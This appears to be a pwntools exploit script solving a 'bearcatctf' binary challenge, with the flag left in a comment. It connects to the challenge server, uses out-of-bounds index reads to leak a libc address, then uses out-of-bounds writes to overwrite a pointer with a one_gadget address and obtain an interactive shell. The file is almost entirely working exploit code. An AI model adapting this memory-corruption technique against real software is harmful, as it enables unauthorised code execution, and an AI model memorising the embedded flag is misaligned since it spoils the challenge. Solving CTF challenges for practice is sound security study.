#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./main_patched")

context.binary = exe
libc = ELF("./libc.so.6")


REMOTE_NC_CMD    = "nc chal.bearcatctf.io 42401"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *main+61
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.sendline(b"1")
    r.sendline(b"-49")
    r.recvuntil(b"index: \n> ")
    leak=hex(int(r.recvline()[:-1]))
    
    r.sendline(b"1")
    r.sendline(b"-50")
    r.recvuntil(b"index: \n> ")
    leak+=hex(int(r.recvline()[:-1]))[2:]
    
    libc.address = int(leak, 16) - libc.sym.puts
    
    one_gadget = 0xe3b01 + libc.address
    
    r.sendline(b"2")
    r.sendline(b"-35")
    r.sendline(bstr(u32(p64(one_gadget)[4:])))
  
    
    r.sendline(b"2")
    r.sendline(b"-36")
    r.sendline(bstr(u32(p64(one_gadget)[:4])))

    r.sendline(b"3")

    r.interactive()
    #BCCTF{L1b_C_3xp3rt_7d1665c6}

if __name__ == "__main__":
    main()